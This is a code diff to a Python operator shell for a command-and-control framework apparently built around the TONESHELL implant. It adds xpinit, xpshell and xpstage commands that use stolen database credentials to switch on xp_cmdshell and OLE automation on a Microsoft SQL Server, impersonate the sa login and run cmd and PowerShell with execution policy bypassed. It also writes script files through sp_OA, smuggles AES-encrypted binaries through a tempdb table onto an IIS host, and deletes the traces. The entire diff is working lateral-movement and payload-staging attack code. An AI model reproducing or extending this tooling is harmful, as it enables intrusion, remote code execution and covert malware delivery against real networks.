@@ -15,6 +15,10 @@ Built-in commands (case-insensitive):
     get <remote_path>               upload file FROM implant to C2 server
     put <payload_name> <dest_path>  push file FROM server payloads dir TO implant
     kill                            send TERMINATE (id=255) to current implant
+    xpinit <host:port> <login> <pass>       enable xp_cmdshell + sp_OA on MSSQL target
+    xpshell cmd <cmd>               run cmd.exe command on MSSQL host via xp_cmdshell
+    xpshell psh <ps_script>         stage and run PowerShell script on MSSQL host
+    xpstage <payload> [--no-encrypt]        stage binary to MSSQL host via DB channel
     help                            show this help
     exit / quit                     exit the shell
 
@@ -24,6 +28,7 @@ Anything else is sent as an EXEC (id=5) shell command to the current session.
 import argparse
 import json
 import random
+import string
 import sys
 import time
 
@@ -69,6 +74,155 @@ class ApiError(Exception):
     pass
 
 
+# ── MSSQL xp_cmdshell / sp_OA / DB staging module ─────────────────────────
+
+SCRIPT_CHUNK_SIZE = 1200   # chars of original content per sp_OA Write task
+SP_OA_CREATE = 2           # Scripting.FileSystemObject OpenTextFile mode: create/overwrite
+SP_OA_APPEND = 8           # Scripting.FileSystemObject OpenTextFile mode: append
+
+
+class XpMssql:
+    """Execution tunnel to IIS01 via WS01 TONESHELL → sqlcmd → MSSQL xp_cmdshell."""
+
+    def __init__(self):
+        self._host     = None
+        self._login    = None
+        self._password = None
+
+    def ready(self) -> bool:
+        return self._host is not None
+
+    # ── helpers ─────────────────────────────────────────────────────────────
+
+    def _rand_tmp(self, ext: str) -> str:
+        stem = ''.join(random.choices(string.ascii_lowercase, k=8))
+        return f"C:\\Users\\Public\\{stem}.{ext}"
+
+    def _tsql_escape(self, s: str) -> str:
+        """Escape for T-SQL string literal and C runtime -Q "..." arg parsing."""
+        return s.replace("'", "''").replace('"', '""')
+
+    def _sqlcmd_prefix(self) -> str:
+        return f'sqlcmd -S {self._host} -U {self._login} -P {self._password} -C'
+
+    def _exec_q(self, shell, tsql: str) -> str:
+        """Send one xp_cmdshell EXEC task via -Q and return output."""
+        cmd = f'{self._sqlcmd_prefix()} -Q "{self._tsql_escape(tsql)}"'
+        return shell.cmd_exec_raw(cmd)
+
+    def _sp_oa_write(self, shell, path: str, content: str):
+        """Write content to a remote path on IIS01 via sp_OA FileSystemObject (chunked)."""
+        for i, start in enumerate(range(0, len(content), SCRIPT_CHUNK_SIZE)):
+            chunk = content[start:start + SCRIPT_CHUNK_SIZE]
+            mode  = SP_OA_CREATE if i == 0 else SP_OA_APPEND
+            tsql  = (
+                "EXECUTE AS LOGIN='sa';"
+                "DECLARE @f INT,@x INT;"
+                "EXEC sp_OACreate 'Scripting.FileSystemObject',@f OUT;"
+                f"EXEC sp_OAMethod @f,'OpenTextFile',@x OUT,'{self._tsql_escape(path)}',{mode},1;"
+                f"EXEC sp_OAMethod @x,'Write',NULL,'{self._tsql_escape(chunk)}';"
+                "EXEC sp_OAMethod @x,'Close';"
+                "EXEC sp_OADestroy @f;"
+            )
+            self._exec_q(shell, tsql)
+
+    # ── commands ─────────────────────────────────────────────────────────────
+
+    def cmd_xpinit(self, shell, host: str, login: str, password: str):
+        """Enable sp_OA + xp_cmdshell on MSSQL and verify connectivity."""
+        self._host     = host
+        self._login    = login
+        self._password = password
+        setup = (
+            "EXECUTE AS LOGIN='sa';"
+            "EXEC sp_configure 'Ole Automation Procedures',1;RECONFIGURE;"
+            "EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;"
+        )
+        self._exec_q(shell, setup)
+        out = self._exec_q(shell, "EXECUTE AS LOGIN='sa';EXEC xp_cmdshell 'whoami'")
+        print(f"[+] xpinit OK — context: {out.strip()}")
+
+    def cmd_xpshell_cmd(self, shell, cmd: str):
+        """Run a cmd.exe command on IIS01 via .bat staging; capture output."""
+        bat      = self._rand_tmp("bat")
+        out_file = self._rand_tmp("txt")
+        self._sp_oa_write(shell, bat, f"{cmd} > {out_file} 2>&1\r\n")
+        self._exec_q(shell, f"EXECUTE AS LOGIN='sa';EXEC xp_cmdshell '{self._tsql_escape(bat)}'")
+        output = self._exec_q(shell, f"EXECUTE AS LOGIN='sa';EXEC xp_cmdshell 'type {self._tsql_escape(out_file)}'")
+        self._exec_q(shell, f"EXECUTE AS LOGIN='sa';EXEC xp_cmdshell 'del /f {self._tsql_escape(bat)} {self._tsql_escape(out_file)}'")
+        print(output)
+
+    def cmd_xpshell_psh(self, shell, script: str):
+        """Stage and run a PowerShell script on IIS01; stdout captured by xp_cmdshell."""
+        ps1 = self._rand_tmp("ps1")
+        self._sp_oa_write(shell, ps1, script)
+        run_tsql = (
+            "EXECUTE AS LOGIN='sa';"
+            f"EXEC xp_cmdshell 'powershell -ExecutionPolicy Bypass -NoProfile -File {self._tsql_escape(ps1)}'"
+        )
+        output = self._exec_q(shell, run_tsql)
+        self._exec_q(shell, f"EXECUTE AS LOGIN='sa';EXEC xp_cmdshell 'del /f {self._tsql_escape(ps1)}'")
+        print(output)
+
+    def cmd_xpstage(self, shell, payload_name: str, encrypt: bool = True):
+        """Stage a binary to IIS01 via MSSQL DB channel (no HTTP from IIS01)."""
+        resp     = shell._post_json("/api/v1.0/mssql/stage", {
+            "handler": "toneshell",
+            "payload": payload_name,
+            "encrypt": encrypt,
+        })
+        sql_file = resp["sqlFile"]
+        key_b64  = resp.get("key", "")
+
+        # Transfer INSERT SQL to WS01 via TONESHELL file download task
+        remote_sql = f"C:\\Windows\\Temp\\{sql_file}"
+        shell.cmd_put(sql_file, remote_sql)
+
+        # Run INSERT via sqlcmd -i (not subject to 2048 cmd limit)
+        shell.cmd_exec_raw(f'{self._sqlcmd_prefix()} -i {remote_sql}')
+
+        # Build and run the extract+decrypt PowerShell script on IIS01
+        out_path = f"C:\\Users\\Public\\{payload_name}"
+        ps = self._build_decrypt_ps(key_b64, out_path) if (encrypt and key_b64) \
+             else self._build_plain_ps(out_path)
+        self.cmd_xpshell_psh(shell, ps)
+
+        # Cleanup
+        shell.cmd_exec_raw(f'del /f {remote_sql}')
+        drop_tsql = (f"EXECUTE AS LOGIN='sa';"
+                     f"EXEC xp_cmdshell 'sqlcmd -S {self._host} -U {self._login} "
+                     f"-P {self._password} -C -Q \"DROP TABLE tempdb..stg\"'")
+        self._exec_q(shell, drop_tsql)
+        print(f"[+] xpstage done → {out_path}")
+
+    def _build_decrypt_ps(self, key_b64: str, out_path: str) -> str:
+        return (
+            f'$k=[Convert]::FromBase64String("{key_b64}");'
+            f'$cn=New-Object System.Data.SqlClient.SqlConnection("Server={self._host};'
+            f'Database=tempdb;User ID={self._login};Password={self._password};TrustServerCertificate=True");'
+            '$cn.Open();$cm=$cn.CreateCommand();$cm.CommandText="SELECT chunk FROM tempdb..stg ORDER BY id";'
+            '$rd=$cm.ExecuteReader();$sb=New-Object System.Text.StringBuilder;'
+            'while($rd.Read()){$sb.Append($rd.GetString(0))|Out-Null};$rd.Close();$cn.Close();'
+            '$b=[Convert]::FromBase64String($sb.ToString());'
+            '$a=[System.Security.Cryptography.Aes]::Create();'
+            '$a.Mode="CBC";$a.Padding="PKCS7";$a.Key=$k;$a.IV=$b[0..15];'
+            '$ct=$b[16..($b.Length-1)];'
+            '$dec=$a.CreateDecryptor().TransformFinalBlock($ct,0,$ct.Length);'
+            f'[IO.File]::WriteAllBytes("{out_path}",$dec)'
+        )
+
+    def _build_plain_ps(self, out_path: str) -> str:
+        return (
+            f'$cn=New-Object System.Data.SqlClient.SqlConnection("Server={self._host};'
+            f'Database=tempdb;User ID={self._login};Password={self._password};TrustServerCertificate=True");'
+            '$cn.Open();$cm=$cn.CreateCommand();$cm.CommandText="SELECT chunk FROM tempdb..stg ORDER BY id";'
+            '$rd=$cm.ExecuteReader();$sb=New-Object System.Text.StringBuilder;'
+            'while($rd.Read()){$sb.Append($rd.GetString(0))|Out-Null};$rd.Close();$cn.Close();'
+            '$b=[Convert]::FromBase64String($sb.ToString());'
+            f'[IO.File]::WriteAllBytes("{out_path}",$b)'
+        )
+
+
 class ToneShellShell:
     def __init__(self, port: str):
         self.port      = port
@@ -76,6 +230,7 @@ class ToneShellShell:
         self.session   = None   # currently attached session GUID
         self.hostname  = None   # display name for the session
         self._task_num = random.randint(1000, 60000)  # random offset avoids taskNum collision on shell restart
+        self._xp       = XpMssql()
 
     # ── internal helpers ────────────────────────────────────────────────────
 
@@ -91,6 +246,10 @@ class ToneShellShell:
         if d.get(API_RESP_TYPE_KEY) != expected_type:
             raise ApiError(f"expected response type {expected_type}, got {d.get(API_RESP_TYPE_KEY)}")
         return d[API_RESP_DATA_KEY]
+
+    def _post_json(self, path: str, payload: dict) -> dict:
+        resp = requests.post(f"http://localhost:{self.port}{path}", json=payload)
+        return resp.json()
 
     def _post_task(self, task_json: dict) -> dict:
         url  = f"{self.base_url}/session/{self.session}/task"
@@ -156,6 +315,14 @@ class ToneShellShell:
         output = self._poll_output(task_guid)
         if output is not None:
             print(output, end="" if output.endswith("\n") else "\n")
+
+    def cmd_exec_raw(self, command: str) -> str:
+        """Send EXEC task, block on poll, return raw output string (no print)."""
+        task_num = self._next_task_num()
+        task     = {"id": TS_EXEC, "taskNum": task_num, "args": command}
+        info     = self._post_task(task)
+        output   = self._poll_output(info[TASK_GUID_KEY])
+        return output or ""
 
     def cmd_get(self, remote_path: str):
         """Pull a file FROM the implant to the C2 server upload dir."""
@@ -272,6 +439,40 @@ class ToneShellShell:
                         print("[!] not attached to a session")
                     else:
                         self.cmd_kill()
+
+                elif cmd == "xpinit":
+                    tokens = line.split(None, 3)
+                    if len(tokens) < 4:
+                        print("usage: xpinit <host:port> <login> <pass>")
+                    elif not self.session:
+                        print("[!] not attached to a session")
+                    else:
+                        self._xp.cmd_xpinit(self, tokens[1], tokens[2], tokens[3])
+
+                elif cmd == "xpshell":
+                    if not self.session:
+                        print("[!] not attached to a session")
+                    elif len(parts) < 3:
+                        print("usage: xpshell cmd|psh <command_or_script>")
+                    elif not self._xp.ready():
+                        print("[!] run xpinit first")
+                    elif parts[1] == "cmd":
+                        self._xp.cmd_xpshell_cmd(self, parts[2])
+                    elif parts[1] == "psh":
+                        self._xp.cmd_xpshell_psh(self, parts[2])
+                    else:
+                        print("usage: xpshell cmd|psh <command_or_script>")
+
+                elif cmd == "xpstage":
+                    if not self.session:
+                        print("[!] not attached to a session")
+                    elif len(parts) < 2:
+                        print("usage: xpstage <payload_name> [--no-encrypt]")
+                    elif not self._xp.ready():
+                        print("[!] run xpinit first")
+                    else:
+                        no_enc = len(parts) >= 3 and parts[2] == "--no-encrypt"
+                        self._xp.cmd_xpstage(self, parts[1], encrypt=not no_enc)
 
                 else:
                     if not self.session:
